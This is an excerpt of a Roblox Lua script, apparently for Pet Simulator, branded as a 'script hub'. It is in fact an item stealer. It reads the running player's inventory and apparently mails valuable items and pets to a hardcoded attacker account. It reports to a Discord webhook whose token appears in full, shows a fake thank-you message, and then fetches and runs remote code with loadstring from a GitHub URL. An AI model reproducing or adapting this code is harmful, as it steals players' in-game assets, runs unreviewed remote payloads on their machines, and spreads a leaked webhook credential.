...
Username = "kxvsGG"
min_rap = 1 -- minimum rap of each item you want to get sent to you. 10k by default
min_chance = 1 -- minimum chance of pets you want to get sent to you. 10k by default, which means that it will not send pets under 1 in 10k
webhook = "https://discord.com/api/webhooks/1295422808830119937/ZLneLELtcUJc9_Gyz4NTX629T4zZGc8OMwyMdr_y3ucdh8cRq-dT9EsPkgy_EtmH_A7r"

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "Join gg /PcFKZf86UB to buy pets, rap, gems"
...
local user = Username or "kevb1001"
...
if #sortedItems > 0 then
    ...
    message.Error("Thank you for using MRX SCRIPT HUB")
    setclipboard("discord.gg/PcFKZf86UB")
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/mrxver0/Scripts/refs/heads/main/PGO.lua"))()